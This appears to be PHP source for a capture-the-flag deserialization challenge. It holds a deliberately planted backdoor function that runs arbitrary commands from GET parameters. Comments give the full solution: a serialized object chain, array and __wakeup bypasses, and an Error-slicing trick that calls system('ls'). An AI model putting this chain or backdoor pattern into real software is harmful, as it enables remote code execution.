<?php
highlight_file(__FILE__);
function backdoor()
{
    $a = $_GET["a"];
    $b = $_GET["b"];
    $d = $_GET["d"];
    $e = $_GET["e"];
    $f = $_GET["f"];
    $g = $_GET["g"];
    $class = new $a($b);
    $str1 = substr($class, $d, $e);
    $str2 = substr($class, $f, $g);
    $str1($str2);
}

class popko
{
    public $left;
    public $right;

//    public function __destruct()
    public function __call($method,$args)
    {
        if (($this->left != $this->right) && (md5($this->left) === md5($this->right)) && (sha1($this->left) === sha1($this->right))) {
            echo "backdoor is here";
            backdoor();
        }
    }

    public function __wakeup()
    {
        $this->left = "";
        $this->right = "";
    }
}

class pipimi
{
    function __destruct()
    {
        echo $this->a->a();
    }
}
// $pipmimi = new pipimi();
// $pipmimi->a = new popko();
// $pipmimi->a->left = array(0 => 1);
// $pipmimi->a->right = array(0 => 2);
// echo serialize($pipmimi);
// O:6:"pipimi":1:{s:1:"a";O:5:"popko":2:{s:4:"left";a:1:{i:0;i:1;}s:5:"right";a:1:{i:0;i:2;}}}

// unserialize('O:6:"pipimi":1:{s:1:"a";O:5:"Popko":2:{s:4:"left";a:1:{i:0;i:1;}s:5:"right";a:1:{i:0;i:2;}}}');// bypass if (strstr($_GET["c"], "popko") === false) but no backdoor
// unserialize('O:6:"pipimi":1:{s:1:"a";O:5:"Popko":3:{s:4:"left";a:1:{i:0;i:1;}s:5:"right";a:1:{i:0;i:2;}}}');// backdoor is here

// use Error to control str1/2 to rce

// eg
// $class = new Error("systemls");
// echo $class;
// $d = 7;
// $e = 6;
// $f = 13;
// $g = 2;
// $str1 = substr($class, $d, $e);
// echo $str1; // system
// $str2 = substr($class, $f, $g);
// echo $str2; // ls
// $str1($str2); // exec ls command